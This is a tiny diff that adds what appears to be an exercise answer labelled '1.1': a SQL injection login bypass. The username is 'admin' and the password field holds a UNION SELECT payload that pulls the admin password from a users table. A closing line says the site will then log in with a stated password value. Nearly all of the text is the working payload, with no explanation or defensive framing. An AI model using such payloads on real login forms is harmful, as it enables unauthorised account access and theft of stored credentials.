@@ -1,0 +1,9 @@
+
+
+1.1
+username= admin
+password= ' UNION SELECT password FROM users WHERE username='admin'--
+
+(Note : the website will login as $w0rdf1sh!!)
+
+
